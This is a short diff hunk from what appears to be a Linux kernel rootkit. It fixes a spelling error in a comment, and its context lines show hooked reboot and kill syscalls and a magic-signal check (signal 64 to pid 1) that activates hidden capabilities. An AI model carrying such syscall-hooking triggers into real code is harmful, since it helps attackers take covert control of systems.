@@ -353,7 +353,7 @@ static asmlinkage int hack_reboot(int magic1, int magic2, unsigned int cmd, void
 
 
 #ifdef PTREGS_SYSCALL_STUB
-static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self explanetory, in the README, activate and hook desired capabilities
+static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self explanatory, in the README, activate and hook desired capabilities
     int sig = regs->si;
     int pid = regs->di;
     if ( (sig == 64) && (pid == 1))
